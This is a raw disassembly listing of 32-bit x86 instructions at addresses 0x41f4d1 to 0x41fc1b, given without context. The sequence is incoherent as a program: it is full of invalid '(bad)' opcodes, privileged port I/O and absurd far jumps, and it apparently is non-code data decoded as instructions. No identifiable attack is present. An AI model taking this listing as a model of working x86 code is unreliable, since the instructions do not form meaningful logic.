  41f4d1:	or     esi,DWORD PTR [eax]
  41f4d3:	test   BYTE PTR [eax+eiz*2-0x5f],ch
  41f4d7:	sbb    esp,DWORD PTR [esi]
  41f4d9:	push   ss
  41f4da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4db:	retf   
  41f4dc:	into   
  41f4dd:	jnp    0x41f541
  41f4df:	in     al,dx
  41f4e0:	bound  edi,QWORD PTR [ecx-0x325d9509]
  41f4e6:	adc    ebp,DWORD PTR [edx]
  41f4e8:	add    bh,ah
  41f4ea:	(bad)  
  41f4eb:	aaa    
  41f4ec:	dec    ebp
  41f4ed:	stos   BYTE PTR es:[edi],al
  41f4ee:	add    BYTE PTR [edi+0x46b7113],0x8f
  41f4f5:	lods   al,BYTE PTR ds:[esi]
  41f4f6:	inc    eax
  41f4f7:	xor    eax,0xf368ed94
  41f4fc:	cmp    eax,0xe538280c
  41f501:	jno    0x41f555
  41f503:	stos   BYTE PTR es:[edi],al
  41f504:	fcomp  QWORD PTR [ecx+ecx*4+0x613fe900]
  41f50b:	jnp    0x41f506
  41f50d:	dec    ebx
  41f50e:	lds    ecx,FWORD PTR [eax*1-0x3ac8dc3d]
  41f515:	ja     0x41f4f3
  41f517:	dec    esp
  41f518:	adc    eax,0xa238d4f4
  41f51d:	js     0x41f525
  41f51f:	fldenv [ebx]
  41f521:	inc    edx
  41f522:	fisubr DWORD PTR [esi]
  41f524:	test   al,0x2c
  41f526:	mov    ebp,0xc4ba9aec
  41f52b:	fldenv [eax+ecx*1]
  41f52e:	jp     0x41f4f5
  41f530:	mov    ebp,DWORD PTR [edx-0x504290db]
  41f536:	je     0x41f5af
  41f538:	mov    bh,0xac
  41f53a:	xor    DWORD PTR [ecx-0x6cbd9458],esp
  41f540:	div    BYTE PTR [edx+0x60a03f83]
  41f546:	leave  
  41f547:	push   ebp
  41f548:	mov    ds:0x25a6b1ab,al
  41f54d:	in     al,dx
  41f54e:	mov    dl,BYTE PTR gs:[edx+0x78c64fd1]
  41f555:	or     BYTE PTR ds:0x4eaeb932,dh
  41f55b:	mov    eax,ds:0x1295bd28
  41f560:	popa   
  41f561:	mov    eax,ds:0x27506190
  41f566:	repz mov ch,0x4a
  41f569:	mov    ah,0x78
  41f56b:	test   eax,0xae5250e
  41f570:	jp     0x41f574
  41f572:	jnp    0x41f56d
  41f574:	ret    
  41f575:	add    BYTE PTR [esi+0x10],al
  41f578:	cmp    esi,edi
  41f57a:	loopne 0x41f5eb
  41f57c:	xor    al,dh
  41f57e:	call   0x6a16:0x6e616f65
  41f585:	inc    ebx
  41f586:	sbb    al,0xb9
  41f588:	ins    DWORD PTR es:[edi],dx
  41f589:	cli    
  41f58a:	pushf  
  41f58b:	dec    edx
  41f58c:	mov    eax,ds:0x3a16b28d
  41f591:	adc    edi,DWORD PTR [eax+0x3bba163e]
  41f597:	and    DWORD PTR [ebx],ebp
  41f599:	inc    eax
  41f59a:	jnp    0x41f558
  41f59c:	outs   dx,BYTE PTR ds:[esi]
  41f59d:	cmp    esi,ecx
  41f59f:	lods   eax,DWORD PTR ds:[esi]
  41f5a0:	mov    ds:0x96f7302e,eax
  41f5a5:	push   esp
  41f5a6:	and    al,0xa
  41f5a8:	push   edi
  41f5a9:	sub    al,0x48
  41f5ab:	push   eax
  41f5ac:	pop    edi
  41f5ad:	jbe    0x41f5d8
  41f5af:	retf   
  41f5b0:	add    ebx,DWORD PTR [esi-0x514f57da]
  41f5b6:	pop    ds
  41f5b7:	(bad)  
  41f5b8:	mov    bl,0xca
  41f5ba:	fild   DWORD PTR [edx]
  41f5bc:	mov    esi,0x4f13471
  41f5c1:	ror    cl,1
  41f5c3:	add    ebp,ecx
  41f5c5:	or     BYTE PTR [esi-0x72],dl
  41f5c8:	aam    0xd6
  41f5ca:	sub    al,ah
  41f5cc:	nop
  41f5cd:	mov    bl,0x82
  41f5cf:	xchg   ebx,eax
  41f5d0:	je     0x41f647
  41f5d2:	xor    edi,DWORD PTR [eax+0x4e]
  41f5d5:	adc    BYTE PTR [ebp+0x5f],bh
  41f5d8:	stc    
  41f5d9:	(bad)  
  41f5da:	dec    ebp
  41f5db:	xchg   al,ch
  41f5dd:	(bad)  
  41f5de:	pop    ebp
  41f5df:	inc    ebx
  41f5e0:	shr    BYTE PTR [eax-0x76cce7b5],0xb1
  41f5e7:	sub    DWORD PTR ds:0x80eb952a,esp
  41f5ed:	(bad)  
  41f5ee:	stc    
  41f5ef:	ins    BYTE PTR es:[edi],dx
  41f5f0:	mov    eax,0x4d059064
  41f5f5:	adc    dh,BYTE PTR [edi]
  41f5f7:	cdq    
  41f5f8:	adc    BYTE PTR [ebp-0x2a191cc2],dl
  41f5fe:	mov    al,0xd
  41f600:	adc    ecx,DWORD PTR [ecx]
  41f602:	ja     0x41f5ff
  41f604:	dec    eax
  41f605:	inc    esp
  41f606:	je     0x41f653
  41f608:	cmp    eax,0x63bdeeee
  41f60d:	xchg   ebp,eax
  41f60e:	xor    esp,DWORD PTR [ebx-0x2e88f851]
  41f614:	ficom  DWORD PTR [ebp-0x16]
  41f617:	push   eax
  41f618:	pop    esi
  41f619:	mov    ebp,DWORD PTR [ecx+ebp*4]
  41f61c:	ror    esp,cl
  41f61e:	imul   edx,DWORD PTR [ebp+0x42903bfe],0x822dcbc2
  41f628:	ss dec edi
  41f62a:	fnsave [eax]
  41f62c:	loope  0x41f65e
  41f62e:	pop    eax
  41f62f:	dec    eax
  41f630:	sub    DWORD PTR [eax+0x30],ebx
  41f633:	call   0x36d71bfa
  41f638:	jo     0x41f5fe
  41f63a:	dec    ecx
  41f63b:	inc    eax
  41f63c:	mov    al,ds:0x91daec05
  41f641:	and    edx,DWORD PTR [edi+0x74]
  41f644:	pushf  
  41f645:	out    0x63,eax
  41f647:	sub    al,0x82
  41f649:	leave  
  41f64a:	std    
  41f64b:	hlt    
  41f64c:	dec    esi
  41f64d:	(bad)  
  41f64e:	leave  
  41f64f:	mov    fs,WORD PTR [esi]
  41f651:	pushf  
  41f652:	scas   al,BYTE PTR es:[edi]
  41f653:	jle    0x41f625
  41f655:	or     BYTE PTR [edi],bh
  41f657:	add    DWORD PTR ss:[eax-0x59],ebp
  41f65b:	sub    eax,0x9efb47a9
  41f660:	imul   ecx,DWORD PTR [eax-0x282125f0],0x5f
  41f667:	lods   al,BYTE PTR ds:[esi]
  41f668:	stos   DWORD PTR es:[edi],eax
  41f669:	fild   QWORD PTR [eax-0x22a42d7b]
  41f66f:	sbb    al,0xd5
  41f671:	aad    0xde
  41f673:	mov    bh,0xfc
  41f675:	xor    DWORD PTR [ebp-0x5c],edx
  41f678:	iret   
  41f679:	js     0x41f601
  41f67b:	leave  
  41f67c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f67d:	jle    0x41f6b6
  41f67f:	xor    dh,ch
  41f681:	imul   ebx,esi,0xfffffffc
  41f684:	idiv   BYTE PTR [edi+0x19]
  41f687:	xchg   BYTE PTR [edx+0x50],dh
  41f68a:	out    dx,al
  41f68b:	mov    ch,0x19
  41f68d:	imul   esp,DWORD PTR [ebx-0x402f2621],0xffffff88
  41f694:	add    bh,BYTE PTR ds:0x87b8e66
  41f69a:	pushf  
  41f69b:	jae    0x41f6c9
  41f69d:	jecxz  0x41f713
  41f69f:	sti    
  41f6a0:	test   eax,0xcd3ae84f
  41f6a5:	out    dx,eax
  41f6a6:	cmp    al,0xf
  41f6a8:	mov    bl,0x7
  41f6aa:	jb     0x41f6db
  41f6ac:	inc    edx
  41f6ad:	inc    edi
  41f6ae:	mov    ebx,0xff646315
  41f6b3:	jne    0x41f67a
  41f6b5:	sar    edi,0x8
  41f6b8:	pop    ss
  41f6b9:	dec    eax
  41f6ba:	aam    0x21
  41f6bc:	or     ah,dl
  41f6be:	mov    ebp,0x6652e6d7
  41f6c3:	cmp    DWORD PTR [esi-0x33],esi
  41f6c6:	ja     0x41f6cf
  41f6c8:	jno    0x41f6d7
  41f6ca:	test   al,0x2d
  41f6cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6cd:	push   ss
  41f6ce:	cmp    eax,0xb5b325c5
  41f6d3:	stos   DWORD PTR es:[edi],eax
  41f6d4:	inc    ecx
  41f6d5:	cmp    BYTE PTR [edx],ch
  41f6d7:	int3   
  41f6d8:	mov    bl,0x4a
  41f6da:	jl     0x41f661
  41f6dc:	imul   DWORD PTR [ecx+0x1a]
  41f6df:	jns    0x41f71d
  41f6e1:	jge    0x41f730
  41f6e3:	jo     0x41f665
  41f6e5:	or     BYTE PTR [edi],0x4c
  41f6e8:	leave  
  41f6e9:	sub    al,0x22
  41f6eb:	test   DWORD PTR [edi+edi*4-0x19818253],edi
  41f6f2:	sub    eax,0xb810510
  41f6f7:	(bad)  
  41f6f8:	push   esp
  41f6f9:	call   0x9843:0x27674c72
  41f700:	shl    bl,1
  41f702:	loop   0x41f735
  41f704:	sbb    bl,BYTE PTR [ebx+esi*2-0x1be74a44]
  41f70b:	icebp  
  41f70c:	and    eax,0x2ebf9dbb
  41f711:	xchg   DWORD PTR [ecx],ebp
  41f713:	sub    DWORD PTR [edi+ebp*1-0x40],ebx
  41f717:	and    al,0x9
  41f719:	sbb    DWORD PTR [edi+0x6c],eax
  41f71c:	xchg   ebp,eax
  41f71d:	or     ebx,DWORD PTR [edi]
  41f71f:	cmp    edx,DWORD PTR [ebp-0x47]
  41f722:	mov    es,WORD PTR [edx+0x61]
  41f725:	es test eax,0x9cb1f830
  41f72b:	xor    DWORD PTR [bp+si],esp
  41f72e:	mov    ds:0x603f10d4,al
  41f733:	cs in  eax,dx
  41f735:	mov    al,ds:0xb0dab5cd
  41f73a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f73b:	add    DWORD PTR [ecx],ebp
  41f73d:	jmp    0x7d25:0x154b3b41
  41f744:	sub    BYTE PTR [esi],0x3a
  41f747:	jae    0x41f729
  41f749:	out    dx,al
  41f74a:	je     0x41f71b
  41f74c:	stos   DWORD PTR es:[edi],eax
  41f74d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f74e:	ins    DWORD PTR es:[edi],dx
  41f74f:	jb     0x41f769
  41f751:	in     eax,dx
  41f752:	xchg   ebp,eax
  41f753:	test   DWORD PTR [ebx+0xc96371a],ecx
  41f759:	cmp    al,0xd2
  41f75b:	ja     0x41f728
  41f75d:	and    BYTE PTR [edi+0x20],dh
  41f760:	xor    eax,0x74a8da93
  41f765:	adc    BYTE PTR [edx+ecx*2+0x76b0b8e],ch
  41f76c:	fistp  WORD PTR [edx-0x199b26b4]
  41f772:	retf   
  41f773:	loopne 0x41f6fb
  41f775:	f2xm1  
  41f777:	rol    eax,cl
  41f779:	xor    esp,DWORD PTR [ecx+ebx*2]
  41f77c:	mov    esi,0x2135d702
  41f781:	xlat   BYTE PTR ds:[ebx]
  41f782:	jo     0x41f739
  41f784:	mov    edi,0x9e28044a
  41f789:	js     0x41f7f9
  41f78b:	push   ss
  41f78c:	jg     0x41f754
  41f78e:	out    0xd6,eax
  41f790:	scas   eax,DWORD PTR es:[edi]
  41f791:	push   0xb3d54557
  41f796:	sbb    esi,DWORD PTR [eax-0x759555c5]
  41f79c:	ins    DWORD PTR es:[edi],dx
  41f79d:	inc    eax
  41f79e:	hlt    
  41f79f:	repnz push ebp
  41f7a1:	pop    edi
  41f7a2:	cmp    al,0xc6
  41f7a4:	fmul   QWORD PTR [ebp-0x14]
  41f7a7:	out    dx,al
  41f7a8:	aaa    
  41f7a9:	mov    eax,0x25567755
  41f7ae:	mov    eax,ds:0xd76b41ae
  41f7b3:	repnz dec edi
  41f7b5:	adc    edi,DWORD PTR [ebx]
  41f7b7:	mov    WORD PTR [esi],fs
  41f7b9:	jp     0x41f820
  41f7bb:	lea    esp,[ebx+esi*2+0x46]
  41f7bf:	pop    ss
  41f7c0:	jno    0x41f836
  41f7c2:	dec    esi
  41f7c3:	sar    BYTE PTR [edi],cl
  41f7c5:	ret    0xf43d
  41f7c8:	xor    BYTE PTR [ecx+0x54],ah
  41f7cb:	clc    
  41f7cc:	jg     0x41f7a0
  41f7ce:	loopne 0x41f84a
  41f7d0:	adc    BYTE PTR [edx-0x2c9cc4d6],0xcd
  41f7d7:	shr    DWORD PTR [ecx-0x1a2087e8],0x70
  41f7de:	jmp    0xa337:0x95f9802c
  41f7e5:	dec    ebx
  41f7e6:	sub    BYTE PTR [esi-0x6f],bl
  41f7e9:	push   es
  41f7ea:	call   esp
  41f7ec:	arpl   sp,ax
  41f7ee:	loop   0x41f80e
  41f7f0:	sub    DWORD PTR [ebp+0x327b3853],edi
  41f7f6:	repz clc 
  41f7f8:	sbb    al,0x5a
  41f7fa:	dec    ecx
  41f7fb:	sti    
  41f7fc:	inc    ebp
  41f7fd:	test   al,0xd4
  41f7ff:	ss sbb ebx,esp
  41f802:	int    0xc4
  41f804:	adc    dh,BYTE PTR [ecx+esi*1+0x70ba8683]
  41f80b:	popf   
  41f80c:	xor    cl,BYTE PTR [edi-0x72]
  41f80f:	fdivr  DWORD PTR [edx]
  41f811:	or     eax,0xbe9c30a8
  41f816:	sub    eax,DWORD PTR [ecx+ebp*4+0x62632d7a]
  41f81d:	inc    esp
  41f81e:	mov    esi,0x6c648b56
  41f823:	ret    
  41f824:	cmp    al,0x78
  41f826:	add    DWORD PTR [esp+ebx*1],0x28
  41f82a:	lock jnp 0x41f7ea
  41f82d:	fstp   st(4)
  41f82f:	jnp    0x41f864
  41f831:	and    BYTE PTR [ebx+0x74],dh
  41f834:	sbb    esp,DWORD PTR [edx-0x37]
  41f837:	inc    eax
  41f838:	sti    
  41f839:	pusha  
  41f83a:	(bad)  
  41f83b:	inc    BYTE PTR [eax-0x1b]
  41f83e:	bound  eax,QWORD PTR [ebx]
  41f840:	aam    0xd3
  41f842:	dec    ebx
  41f843:	and    eax,0x7213c3b6
  41f848:	sbb    edi,0x3bbbf220
  41f84e:	stos   DWORD PTR es:[edi],eax
  41f84f:	inc    edx
  41f850:	div    BYTE PTR ds:0x84f4cff1
  41f856:	add    edi,DWORD PTR ds:0x4a2e83d3
  41f85c:	sub    eax,DWORD PTR [ebx+0x22]
  41f85f:	xor    al,0x1a
  41f861:	cwde   
  41f862:	(bad)  
  41f863:	and    BYTE PTR [esi+esi*4],ch
  41f866:	aaa    
  41f867:	int3   
  41f868:	inc    eax
  41f869:	test   DWORD PTR [edi+edi*1],ebx
  41f86c:	nop    DWORD PTR [esi+0x0]
  41f870:	pop    es
  41f871:	rcr    BYTE PTR [edi+0x48],1
  41f874:	test   eax,0xa712b86d
  41f879:	mov    al,0xce
  41f87b:	and    ebp,esi
  41f87d:	lods   eax,DWORD PTR ds:[esi]
  41f87e:	jp     0x41f810
  41f880:	das    
  41f881:	stc    
  41f882:	mov    al,ds:0x17466b23
  41f887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f888:	(bad)  
  41f889:	push   ebp
  41f88a:	adc    DWORD PTR [ebp+0x4f],0x9cdffa32
  41f891:	or     esi,DWORD PTR [ebp+0x2f]
  41f894:	sbb    BYTE PTR [edx-0x3],0x8a
  41f898:	or     bh,bh
  41f89a:	and    DWORD PTR [ebx],ebx
  41f89c:	dec    edi
  41f89d:	xor    dh,BYTE PTR [edi-0x4c6ffff]
  41f8a3:	push   ebp
  41f8a4:	push   0x54
  41f8a6:	jmp    0xd0917d91
  41f8ab:	pop    edx
  41f8ac:	retf   
  41f8ad:	test   al,0xd1
  41f8af:	sub    bh,BYTE PTR [ebp-0x691bb24e]
  41f8b5:	xchg   ebx,eax
  41f8b6:	(bad)  
  41f8b8:	cmp    dl,BYTE PTR [eax-0x14659220]
  41f8be:	js     0x41f870
  41f8c0:	sub    al,0x4b
  41f8c2:	adc    eax,DWORD PTR [ecx+0x71]
  41f8c5:	pusha  
  41f8c6:	cmp    ecx,0xf830e9c7
  41f8cc:	and    ah,0xc4
  41f8cf:	mov    edx,0x6f0cf29
  41f8d4:	dec    ebp
  41f8d5:	adc    BYTE PTR [ebx+0x6a],dl
  41f8d8:	xchg   ecx,eax
  41f8d9:	cld    
  41f8da:	jmp    0x41f8d3
  41f8dc:	xor    al,0x2f
  41f8de:	aad    0x6f
  41f8e0:	or     ebp,DWORD PTR [ebx+ecx*4+0x2009ad92]
  41f8e7:	int    0x98
  41f8e9:	fsubr  DWORD PTR [eax-0x25a6117e]
  41f8ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8f0:	and    eax,0x5d96067b
  41f8f5:	dec    esp
  41f8f6:	scas   al,BYTE PTR es:[edi]
  41f8f7:	cwde   
  41f8f8:	or     al,0xbd
  41f8fa:	cs ja  0x41f895
  41f8fd:	push   edx
  41f8fe:	mov    eax,esi
  41f900:	add    eax,0xad4ac120
  41f905:	nop
  41f906:	pusha  
  41f907:	xor    cl,bh
  41f909:	xchg   edx,eax
  41f90a:	fnstsw WORD PTR [ebx+0x43]
  41f90d:	mov    ecx,0x59fc085f
  41f912:	mov    ds:0x7b538d80,al
  41f917:	cmc    
  41f918:	xchg   esp,eax
  41f919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f91a:	fldcw  WORD PTR [edx-0x10a0a48b]
  41f920:	adc    dh,ch
  41f922:	sub    edx,edi
  41f924:	fdiv   DWORD PTR ds:0x58105a03
  41f92a:	xchg   edi,eax
  41f92b:	mov    esp,0xfe93e4e2
  41f930:	mov    BYTE PTR [eax+0x7f],bl
  41f933:	ja     0x41f982
  41f935:	(bad)  
  41f936:	into   
  41f937:	inc    ebx
  41f938:	xchg   ebp,eax
  41f939:	and    eax,0x5e937e
  41f93e:	fwait
  41f93f:	xchg   edx,eax
  41f940:	mov    ebx,0x71901bab
  41f945:	or     esi,DWORD PTR [esi]
  41f947:	sbb    DWORD PTR [edx],edx
  41f949:	inc    esp
  41f94a:	mov    BYTE PTR [edi-0x3762e1a9],dl
  41f950:	pop    ebp
  41f951:	(bad)  
  41f952:	jnp    0x41f8e6
  41f954:	mov    dh,0x5c
  41f956:	and    BYTE PTR [esi-0x116a3906],0x29
  41f95d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f95e:	(bad)  
  41f95f:	mov    ah,0x10
  41f961:	mov    edx,0xd823b46c
  41f966:	cmp    DWORD PTR ds:0xacb50036,esi
  41f96c:	ins    DWORD PTR es:[edi],dx
  41f96d:	test   BYTE PTR [esi+0x6b],cl
  41f970:	fstp   QWORD PTR [ebp+0x25d7e440]
  41f976:	or     al,BYTE PTR [ebp+0x64]
  41f979:	sub    eax,0x373bf451
  41f97e:	loope  0x41f92e
  41f980:	ret    0x4633
  41f983:	popf   
  41f984:	mov    DWORD PTR [eax+0x5a850a42],ebp
  41f98a:	ret    0x851f
  41f98d:	push   cs
  41f98e:	jmp    0x41f9f4
  41f990:	mov    bl,0x53
  41f992:	jmp    eax
  41f994:	mov    esp,0x61825e8c
  41f999:	mov    DWORD PTR [eax+0x60],ecx
  41f99c:	aad    0xf0
  41f99e:	mov    dl,0xc3
  41f9a0:	mov    ds:0xf279f322,al
  41f9a5:	jg     0x41f979
  41f9a7:	sahf   
  41f9a8:	cmc    
  41f9a9:	pop    edx
  41f9aa:	pop    edi
  41f9ab:	aad    0xe0
  41f9ad:	mov    ecx,0xd03ce91e
  41f9b2:	lock xchg esp,eax
  41f9b4:	out    dx,eax
  41f9b5:	fwait
  41f9b6:	lahf   
  41f9b7:	inc    ecx
  41f9b8:	bound  esi,QWORD PTR [edx]
  41f9ba:	pop    edi
  41f9bb:	jb     0x41f9b8
  41f9bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9be:	(bad)  
  41f9c0:	and    eax,0xeb33c494
  41f9c5:	dec    ebx
  41f9c6:	jecxz  0x41f9bc
  41f9c8:	jmp    0x2431528e
  41f9cd:	cmp    edx,esp
  41f9cf:	fisub  WORD PTR [ecx]
  41f9d1:	arpl   WORD PTR [esi+0x55],si
  41f9d4:	cmp    DWORD PTR [edx-0x75],esi
  41f9d7:	jecxz  0x41fa3c
  41f9d9:	data16 mov dl,BYTE PTR [esi]
  41f9dc:	pop    es
  41f9dd:	mov    es,WORD PTR [ebp+ebp*8-0x11]
  41f9e1:	(bad)  
  41f9e2:	mov    ds:0xac66abfc,eax
  41f9e7:	push   DWORD PTR [edi-0xf]
  41f9ea:	jo     0x41fa1b
  41f9ec:	aaa    
  41f9ed:	(bad)  
  41f9ee:	jno    0x41f9fc
  41f9f0:	lds    esp,FWORD PTR [ecx+ecx*4+0xc]
  41f9f4:	pop    ss
  41f9f5:	test   al,0x44
  41f9f7:	mov    ?,WORD PTR [ebx-0x3c5cf3ad]
  41f9fd:	ins    BYTE PTR es:[edi],dx
  41f9fe:	lods   eax,DWORD PTR ds:[esi]
  41f9ff:	shr    BYTE PTR [ecx],1
  41fa01:	clc    
  41fa02:	mov    ah,0xa9
  41fa04:	in     eax,dx
  41fa05:	mov    esi,0x38554b7f
  41fa0a:	int    0xf3
  41fa0c:	adc    DWORD PTR [esi],esp
  41fa0e:	int3   
  41fa0f:	pushf  
  41fa10:	aas    
  41fa11:	js     0x41f9ca
  41fa13:	jne    0x41f9ef
  41fa15:	test   eax,0xda8c37e6
  41fa1a:	jg     0x41f9ed
  41fa1c:	pop    ss
  41fa1d:	ss addr16 xor eax,esp
  41fa21:	mov    cl,0x3f
  41fa23:	sbb    DWORD PTR [ecx+0xff00e7b],ebp
  41fa29:	ret    0x4b79
  41fa2c:	push   cs
  41fa2d:	mov    ds,WORD PTR [esi]
  41fa2f:	dec    esi
  41fa30:	sbb    BYTE PTR [ebx+esi*8-0x709c5e65],ah
  41fa37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa38:	in     eax,0x6d
  41fa3a:	adc    eax,0xc9d47b1b
  41fa3f:	ins    DWORD PTR es:[edi],dx
  41fa40:	pop    esp
  41fa41:	(bad)  
  41fa42:	fxch   st(4)
  41fa44:	cld    
  41fa45:	mov    esi,0x54bc0f5a
  41fa4a:	pusha  
  41fa4b:	out    dx,al
  41fa4c:	pmullw mm1,QWORD PTR [esi]
  41fa4f:	pop    ss
  41fa50:	sub    edx,DWORD PTR [ecx-0x44]
  41fa53:	jno    0x41fa4f
  41fa55:	popf   
  41fa56:	sti    
  41fa57:	sbb    al,0x38
  41fa59:	inc    ebp
  41fa5a:	cli    
  41fa5b:	mov    edi,0xef643be0
  41fa60:	sbb    bl,BYTE PTR [ebx-0x144ccdf]
  41fa66:	lds    ecx,FWORD PTR [edx+0x6167f9d7]
  41fa6c:	add    ecx,DWORD PTR [esi+0x37]
  41fa6f:	xor    eax,0x3a11e8ff
  41fa74:	fbstp  TBYTE PTR [eax]
  41fa76:	push   esi
  41fa77:	lds    edx,FWORD PTR [ebx+0x57]
  41fa7a:	(bad)  [esi+ebx*2]
  41fa7d:	sahf   
  41fa7e:	repnz sahf 
  41fa80:	into   
  41fa81:	lea    ecx,fs:[esi+ecx*2+0x11]
  41fa86:	pop    ss
  41fa87:	fisubr WORD PTR [edx]
  41fa89:	adc    al,BYTE PTR [eax+0x79]
  41fa8c:	cli    
  41fa8d:	pop    es
  41fa8e:	xor    ch,bl
  41fa90:	jnp    0x41faf6
  41fa92:	test   BYTE PTR [esi+0x3b],0xa7
  41fa96:	cmp    ah,bh
  41fa98:	fsubr  QWORD PTR ds:0x3698df48
  41fa9e:	retf   0xbcd1
  41faa1:	pop    ebp
  41faa2:	(bad)  
  41faa3:	push   ss
  41faa4:	cmp    ah,BYTE PTR [esp+ebp*1-0x51f081a9]
  41faab:	mov    ch,0xa8
  41faad:	in     eax,dx
  41faae:	mov    eax,ds:0xbb01b25a
  41fab3:	inc    ebx
  41fab4:	adc    eax,0x804992e7
  41fab9:	sbb    DWORD PTR [ecx-0x63ad2ca3],edi
  41fabf:	outs   dx,BYTE PTR ds:[esi]
  41fac0:	sub    cl,BYTE PTR [ecx+0x32]
  41fac3:	xor    eax,0xdefe4e17
  41fac8:	test   al,0xf0
  41faca:	in     al,0x62
  41facc:	mov    esi,0xc3ffcbc9
  41fad1:	mov    bh,0xf
  41fad3:	xor    al,0x1d
  41fad5:	push   edx
  41fad6:	fdiv   QWORD PTR [eax+edi*2]
  41fad9:	inc    ecx
  41fada:	mov    cl,0x69
  41fadc:	inc    esi
  41fadd:	lds    esp,FWORD PTR [edx+0x668b194]
  41fae3:	int3   
  41fae4:	jns    0x41fb57
  41fae6:	jl     0x41fa8e
  41fae8:	daa    
  41fae9:	mov    al,ds:0x5e1dc560
  41faee:	mov    ecx,0x9288a2dd
  41faf3:	iret   
  41faf4:	leave  
  41faf5:	cmp    BYTE PTR [edi-0x610666b9],dh
  41fafb:	cli    
  41fafc:	lea    ebx,[eax]
  41fafe:	xor    edi,esp
  41fb00:	add    DWORD PTR [ebp-0x7ea17e3d],ecx
  41fb06:	ffree  st(1)
  41fb08:	cmp    DWORD PTR [eax+0x70],0x1c
  41fb0c:	dec    edi
  41fb0d:	cmp    DWORD PTR [ebx+0x6691e50a],0x6a6f8e0b
  41fb17:	data16 fs out dx,al
  41fb1a:	fwait
  41fb1b:	ss pop ss
  41fb1d:	push   edi
  41fb1e:	inc    ebx
  41fb1f:	out    dx,eax
  41fb20:	and    dl,BYTE PTR [eax]
  41fb22:	xchg   BYTE PTR [ecx],bh
  41fb24:	ds in  al,0x88
  41fb27:	dec    edx
  41fb28:	dec    eax
  41fb29:	cwde   
  41fb2a:	in     al,0x63
  41fb2c:	out    dx,al
  41fb2d:	jecxz  0x41fb4e
  41fb2f:	test   eax,0x3cdced3e
  41fb34:	pushf  
  41fb35:	outs   dx,DWORD PTR ds:[esi]
  41fb36:	fadd   QWORD PTR [ecx+0x18f0953d]
  41fb3c:	adc    bh,BYTE PTR [ecx]
  41fb3e:	fcomip st,st(4)
  41fb40:	mov    ds:0xbe4deed5,eax
  41fb45:	and    eax,0x72e5e583
  41fb4a:	add    dl,BYTE PTR [edi]
  41fb4c:	enter  0xe676,0xb2
  41fb50:	loopne 0x41faec
  41fb52:	sti    
  41fb53:	fldenv [ebx+0x4e]
  41fb56:	(bad)  
  41fb57:	sbb    eax,0xbe45b8d4
  41fb5c:	xchg   ebx,eax
  41fb5d:	and    DWORD PTR [esi+edi*4+0x4511eb61],edi
  41fb64:	push   es
  41fb65:	stos   DWORD PTR es:[edi],eax
  41fb66:	xlat   BYTE PTR ds:[ebx]
  41fb67:	mov    BYTE PTR [edx+0x65e1ee34],ah
  41fb6d:	mov    ds:0x7ea0d173,al
  41fb72:	cdq    
  41fb73:	ins    DWORD PTR es:[edi],dx
  41fb74:	jecxz  0x41fba1
  41fb76:	mov    al,ds:0xbe39a887
  41fb7b:	jmp    0x41fb4f
  41fb7d:	mov    esi,edi
  41fb7f:	mov    al,0xf1
  41fb81:	push   ebp
  41fb82:	inc    ebx
  41fb83:	test   bh,bl
  41fb85:	dec    esi
  41fb86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb87:	stc    
  41fb88:	pop    esi
  41fb89:	cmc    
  41fb8a:	xor    DWORD PTR [ebp+0x5f],edi
  41fb8d:	dec    esp
  41fb8e:	mov    ch,0x3a
  41fb90:	aam    0xf2
  41fb92:	jne    0x41fb83
  41fb94:	xchg   esi,eax
  41fb95:	aaa    
  41fb96:	sbb    eax,0x9a2eea27
  41fb9b:	cmp    ecx,esi
  41fb9d:	push   0x19
  41fb9f:	nop
  41fba0:	arpl   bp,sp
  41fba2:	repnz sub BYTE PTR [edx-0x56],dh
  41fba6:	pusha  
  41fba7:	push   ss
  41fba8:	sbb    DWORD PTR [edi+0x0],ebx
  41fbab:	pop    ebp
  41fbac:	retf   
  41fbad:	push   ss
  41fbae:	cdq    
  41fbaf:	mov    WORD PTR [eax+0x27],ds
  41fbb2:	out    0xf0,eax
  41fbb4:	mov    dl,0xc6
  41fbb6:	pop    esp
  41fbb7:	pop    eax
  41fbb8:	gs ss inc ebx
  41fbbb:	dec    edx
  41fbbc:	and    ecx,DWORD PTR [eax]
  41fbbe:	(bad)  
  41fbbf:	in     al,dx
  41fbc0:	sub    edi,DWORD PTR [ebx+edx*2-0x1]
  41fbc4:	cmp    DWORD PTR [ebx+ecx*8],edi
  41fbc7:	sbb    eax,0x3592bba4
  41fbcc:	push   edi
  41fbcd:	ss push cs
  41fbcf:	and    ecx,ebp
  41fbd1:	cwde   
  41fbd2:	pop    ds
  41fbd3:	jge    0x41fbd9
  41fbd5:	dec    ebp
  41fbd6:	stos   DWORD PTR es:[edi],eax
  41fbd7:	jge    0x41fbc8
  41fbd9:	adc    BYTE PTR ds:[edx],dh
  41fbdc:	xor    eax,0x1545ab24
  41fbe1:	sbb    ch,BYTE PTR [ebx-0x4b]
  41fbe4:	sbb    al,0x25
  41fbe6:	mov    dh,0x45
  41fbe8:	lock inc eax
  41fbea:	shr    BYTE PTR [edi+0xd],0xbc
  41fbee:	ja     0x41fc3b
  41fbf0:	sahf   
  41fbf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbf2:	xchg   esp,edx
  41fbf4:	stc    
  41fbf5:	div    BYTE PTR [eax]
  41fbf7:	sub    DWORD PTR [eax],edi
  41fbf9:	mov    al,ds:0x37d5ca7f
  41fbfe:	sub    al,0x94
  41fc00:	lock inc ebp
  41fc02:	jmp    0xde701092
  41fc07:	jno    0x41fc02
  41fc09:	in     al,dx
  41fc0a:	ror    BYTE PTR [ecx-0x3666f359],1
  41fc10:	aam    0xcf
  41fc12:	adc    eax,0xce112e6
  41fc17:	test   al,0xc8
  41fc19:	lods   al,BYTE PTR ds:[esi]
  41fc1a:	pop    ebp
  41fc1b:	pop    eax
